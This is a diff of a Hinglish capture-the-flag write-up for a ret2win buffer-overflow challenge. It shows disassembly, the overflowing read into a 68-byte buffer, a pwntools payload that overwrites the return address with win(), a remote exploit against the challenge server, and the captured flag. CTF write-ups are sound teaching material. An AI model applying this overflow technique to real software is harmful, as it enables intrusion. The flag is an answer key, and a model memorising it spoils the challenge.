@@ -34,47 +34,56 @@ FLAG_NOT_SET
 Isse clear ho gaya ki yeh ret2win type challenge hai.
 
 Step 3: Disassemble karna
-Bashobjdump -d chall | less
-Do important functions mile:
+Bash
+objdump -d chall | less
 
+Do important functions mile:
 vuln() → Yahan vulnerability hai
 win() → Address = 0x80491a6 (yahan flag print hota hai)
 
 
 Step 4: Vulnerability samajhna
+
 vuln() function mein:
-Cchar buffer[68];                // chhota buffer
-read(0, buffer, 200);           // 200 bytes padh raha hai → Buffer Overflow
+--------------------------------------------------------------------------------------------
+Cchar buffer[68];                // chhota buffer                                          |
+read(0, buffer, 200);           // 200 bytes padh raha hai → Buffer Overflow               |
+--------------------------------------------------------------------------------------------
 Stack layout:
-
-Buffer start hota hai -0x48(%ebp) se
-Return address tak 76 bytes ka distance hai
-
+----------------------------------------------
+Buffer start hota hai -0x48(%ebp) se         |
+Return address tak 76 bytes ka distance hai  |
+----------------------------------------------
 
 Step 5: Payload banana
-Pythonfrom pwn import *
 
-win_addr = 0x80491a6
-offset = 76
+Python
+----------------------------------------------
+from pwn import *                            |
+win_addr = 0x80491a6                         |
+offset = 76                                  |
+payload = b"A" * offset + p32(win_addr)      |
+----------------------------------------------
+Step 6:
 
-payload = b"A" * offset + p32(win_addr)
-
-Step 6: Remote server pe exploit karna
-Pythonfrom pwn import *
-
-io = remote("cybersub.bytesoc.dev", 9999)
-
-print(io.recvuntil(b"input:").decode())
-io.send(payload)
-
-print(io.recvall(timeout=3).decode())
+Remote server pe exploit karna
+Python
+----------------------------------------------
+from pwn import *                            |
+io = remote("cybersub.bytesoc.dev", 9999)    |
+print(io.recvuntil(b"input:").decode())      |
+io.send(payload)                             |
+print(io.recvall(timeout=3).decode())        |
+----------------------------------------------
 
 Step 7: Result
-textYou win!
-BYTE{Buff3r_OverFl0w_k3_N45he}
+text
+----------------------------------------------
+You win!                                     |
+BYTE{Buff3r_OverFl0w_k3_N45he}               |
+----------------------------------------------
 
 Final Answer:
-BYTE{Buff3r_OverFl0w_k3_N45he}
-
-Summary:
-
+----------------------------------------------
+|   BYTE{Buff3r_OverFl0w_k3_N45he}           |
+----------------------------------------------
